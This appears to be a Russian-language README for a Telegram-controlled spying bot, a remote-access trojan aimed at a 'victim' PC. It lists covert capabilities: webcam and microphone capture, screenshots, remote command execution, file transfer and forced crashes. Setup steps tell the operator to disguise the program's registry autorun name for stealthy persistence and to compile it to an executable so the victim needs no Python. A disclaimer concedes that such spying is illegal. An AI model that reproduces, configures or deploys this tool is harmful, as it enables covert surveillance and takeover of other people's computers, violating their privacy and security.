# **Бот для шпионажа.**
Вы можете удаленно упрвлять ПК через телеграм бота.

# **Возможности:**
1. Перезагрузить ПК
2. Выключить ПК
3. Вызвать BSOD
4. Подключиться к веб камере и получить видео с веб камеры.
5. Сделать скриншот экрана ПК
6. Узнать IP адрес ПК
7. Вывести сообщение на экран ПК
8. Загуглить на ПК
9. Перехват звука с микрофона жертвы
10. Управление командной строкой (можно вводить команды в командную строку
    на ПК жертвы)
11. Закачать файл на ПК
12. Отправить файл на ПК

# **Запуск слежки**
1. Установить зависимости из `requirements.txt`
2. В `API = 'токен бота'` напишите токен вашего бота
3. В `exe_file_name = "sherlokbot.exe"` напишите название файла, который будет следить за жертвой (который скомпилируете)
4. В `winreg.SetValueEx(registry_key, "MyProgram", 0, winreg.REG_SZ, exe_file_path_in_c_drive + " -runas")` вместо MyProgram замаскируйте вашу слежку, это название будет стоять в автозагрузке системы
5. В `DEVELOPER_USER_ID = 802305368` измените цыфры на айди вашего аккаунта телеграм, который будет следить

Для компиляции слежки, вам потребуется программа компилятор. Рекомендую воспользоваться компилятором от меня,
`py to exe.py`. Просто введите путь к коду и запустите скрипт. После окончания, созданный exe будет в папке **dist**


**Python ставить на компьютер жертвы больше не нужно!**

# **ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ**
Я не несу ответственность за ваше использование моей программы, все действия вы совершаете на свой страх риск. 
Напомню, слежка незаконна, будьте осторожны!
